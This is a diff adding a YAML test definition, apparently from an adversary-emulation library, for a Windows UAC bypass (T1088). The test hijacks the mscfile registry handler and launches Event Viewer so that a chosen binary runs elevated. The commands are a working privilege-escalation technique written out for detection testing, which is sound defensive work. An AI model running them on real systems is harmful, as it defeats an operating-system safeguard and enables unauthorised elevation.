@@ -1,0 +1,23 @@
+---
+attack_technique: T1088
+display_name: Bypass User Account Control
+
+atomic_tests:
+- name: Bypass UAC using Event Viewer
+  description: |
+    Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    executable_binary:
+      description: Binary to execute with UAC Bypass
+      type: path
+      default: C:\Windows\System32\cmd.exe
+
+  executor:
+    name: command_prompt
+    command: |
+      reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
+      cmd.exe -c eventvwr.msc
